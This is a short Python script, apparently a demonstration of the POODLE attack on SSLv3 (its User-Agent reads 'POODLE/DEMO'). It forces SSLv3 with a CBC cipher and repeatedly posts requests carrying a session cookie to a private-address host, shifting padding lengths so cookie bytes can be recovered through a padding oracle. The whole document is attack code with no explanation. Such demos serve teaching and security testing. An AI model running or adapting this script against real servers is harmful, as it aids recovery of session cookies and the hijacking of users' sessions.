#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import ssl
import sys
from http.client import *

HOST = '172.10.1.1'
PORT = 2000
COOKIE_VALUE = '40f37b6e-5a12-46a2-9b16-61fa5ffca10f'

try:
    start = int(sys.argv[1])
except:
    start = 0

path = 'A' * (12 + start)
body = 'B' * (72 - start)


class Connection(HTTPSConnection):
    def _send_output(self, message_body=None, encode_chunked=False):
        self._buffer.extend((b"", b""))
        msg = b"\r\n".join(self._buffer)
        del self._buffer[:]
        self.send(msg + message_body)



ctx = ssl.SSLContext(ssl.PROTOCOL_SSLv3)
ctx.set_ciphers('AES128-SHA')
ctx.check_hostname = False

print('Cookie:', COOKIE_VALUE)

i = 0
while True:
    i += 1
    print(i, end=': ')
    conn = Connection(HOST, PORT, context=ctx)
    conn.request('POST', '/' + path, body, {
        'User-Agent': 'POODLE/DEMO',
        'Cookie': 'SESSION=' + COOKIE_VALUE
    })
    try:
        conn.getresponse()
    except ssl.SSLError as e:
        print(e)
        continue
    else:
        path += 'A'
        body = body[:-1]
        i = 0

